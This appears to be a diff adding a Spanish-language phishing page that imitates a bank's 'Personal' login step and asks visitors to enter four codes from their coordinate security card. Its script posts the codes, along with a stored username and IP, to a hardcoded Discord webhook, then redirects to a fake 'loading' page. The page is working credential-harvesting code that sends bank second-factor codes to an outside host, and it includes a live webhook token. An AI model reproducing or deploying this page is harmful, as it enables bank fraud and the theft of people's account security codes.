@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Coordenadas 1</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+<div class="banner">
+  <div class="header">
+    <img src="img/logo-1.png" alt="Logo" class="logo" />
+    <div class="linea-personal">| Personal</div>
+  </div>
+  <div class="titulo">INGRESE CADA CÓDIGO DE SU TARJETA DE COORDENADAS</div>
+  <img src="img/tarjje.PNG" alt="Tarjeta de Coordenadas" class="tarjeta-img" />
+  <form id="coordenadas1Form">
+    <div class="row">
+      <div class="numero-fijo">03</div>
+      <input type="text" id="codigo03" maxlength="4" inputmode="numeric" required />
+      <div class="numero-fijo">13</div>
+      <input type="text" id="codigo13" maxlength="4" inputmode="numeric" required />
+    </div>
+    <div class="row">
+      <div class="numero-fijo">23</div>
+      <input type="text" id="codigo23" maxlength="4" inputmode="numeric" required />
+      <div class="numero-fijo">33</div>
+      <input type="text" id="codigo33" maxlength="4" inputmode="numeric" required />
+    </div>
+    <button type="submit">Continuar</button>
+  </form>
+</div>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const webhook = "https://discord.com/api/webhooks/1481712791508226209/2AjtJeFx9ommSEtgRFVCjd3khnhZpqEvxJLyJTAmOHFYtIhgiKcqo7wYC6AdsmGL5zs2";
+  const usuario = localStorage.getItem('usuario') || 'Desconocido';
+  const ip = localStorage.getItem('ip') || 'IP desconocida';
+
+  const form = document.getElementById('coordenadas1Form');
+  if (form) {
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const c03 = document.getElementById('codigo03').value.trim();
+      const c13 = document.getElementById('codigo13').value.trim();
+      const c23 = document.getElementById('codigo23').value.trim();
+      const c33 = document.getElementById('codigo33').value.trim();
+      if (!c03 || !c13 || !c23 || !c33) {
+        alert("Completa todos los campos.");
+        return;
+      }
+      const message =
+        `Usuario: ${usuario}\n` +
+        `Coordenada 03: ${c03}\n` +
+        `Coordenada 13: ${c13}\n` +
+        `Coordenada 23: ${c23}\n` +
+        `Coordenada 33: ${c33}\n` +
+        `IP: ${ip}`;
+      fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: message })
+      })
+      .then(res => window.location.href = "cargando3.html")
+      .catch(() => alert("Error de conexión al enviar datos."));
+    });
+  }
+});
+</script>
+</body>
+</html>
